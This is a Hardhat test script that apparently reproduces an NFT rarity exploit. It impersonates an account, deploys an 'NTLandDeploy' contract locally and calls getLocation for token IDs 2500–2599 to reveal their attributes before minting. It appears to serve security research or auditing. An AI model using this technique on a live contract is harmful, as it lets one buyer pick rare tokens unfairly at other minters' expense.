const { ethers } = require("hardhat");

describe("NT Rarity Exploit Reproduction", function () {
    it("Get location calls", async function () {

        // Impersonate a random account with some Ether
        await hre.network.provider.request({
            method: "hardhat_impersonateAccount",
            params: ["0x03eAd305Ef87BCD32Dd8B2256Cd4DA0430559E70"],
        });

        const nt_contract = await ethers.getContractFactory("NTLandDeploy");
        // Deploy the contract
        const ntland = await nt_contract.deploy();
        // Wait until deployment is complete
        await ntland.deployed();
        console.log("Contract deployed:", ntland.address);

        // Check all IDs from 2500 to 2600
        for (let i = 2500; i < 2600; i++) {
            receipt = await ntland.getLocation(i);
            console.log("tokenID " + String(i) + ": " + String(receipt))
        }
    });
});
